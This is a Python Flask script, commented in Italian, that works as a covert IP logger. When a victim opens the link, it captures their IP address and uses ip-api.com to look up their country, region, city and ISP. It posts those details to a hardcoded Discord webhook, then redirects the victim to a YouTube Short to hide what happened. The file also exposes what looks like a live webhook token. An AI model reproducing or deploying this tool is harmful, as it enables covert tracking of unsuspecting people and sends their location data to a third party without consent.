from flask import Flask, request, redirect
from datetime import datetime
import requests
import os

app = Flask(__name__)

# TUO WEBHOOK PERSONALE
WEBHOOK_URL = "https://discord.com/api/webhooks/1528013241819594853/ajTR7-zJ32yBsxulXb4688xXeWaqVgr9pQk6dW3ffPpFaeWgbWydLkRQyH6M56515lNA"

def get_real_ip(request):
    """Prende solo l'IP reale del client"""
    forwarded = request.headers.get('X-Forwarded-For', '')
    if forwarded:
        return forwarded.split(',')[0].strip()
    return request.remote_addr

def get_ip_info(ip):
    """Ottiene info geolocalizzazione"""
    try:
        response = requests.get(
            f"http://ip-api.com/json/{ip}?fields=country,regionName,city,isp",
            timeout=10
        )
        if response.status_code == 200:
            data = response.json()
            if data.get("status") == "success":
                return {
                    "country": data.get("country", "N/D"),
                    "region": data.get("regionName", "N/D"),
                    "city": data.get("city", "N/D"),
                    "isp": data.get("isp", "N/D")
                }
    except Exception as e:
        print(f"Errore API: {e}")
    return None

@app.route("/")
def index():
    ip = get_real_ip(request)
    date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")
    
    print(f"🌐 IP reale: {ip}")
    
    ip_info = get_ip_info(ip)
    
    description = f"**📅 Data:** {date}\n"
    if ip_info:
        description += f"**🌍 Paese:** {ip_info.get('country', 'N/D')}\n"
        description += f"**📍 Regione:** {ip_info.get('region', 'N/D')}\n"
        description += f"**🏙️ Città:** {ip_info.get('city', 'N/D')}\n"
        description += f"**🔌 ISP:** {ip_info.get('isp', 'N/D')}"
    else:
        description += "**⚠️ Geolocalizzazione non disponibile**"
    
    data = {
        "content": "🔔 **Nuovo IP loggato!**",
        "embeds": [{
            "title": f"IP: {ip}",
            "description": description,
            "color": 5814783,
            "timestamp": date
        }]
    }
    
    try:
        response = requests.post(WEBHOOK_URL, json=data)
        if response.status_code == 204:
            print(f"✅ Inviato: {ip}")
        else:
            print(f"❌ Errore: {response.status_code}")
    except Exception as e:
        print(f"❌ Eccezione: {e}")
    
    return redirect("https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
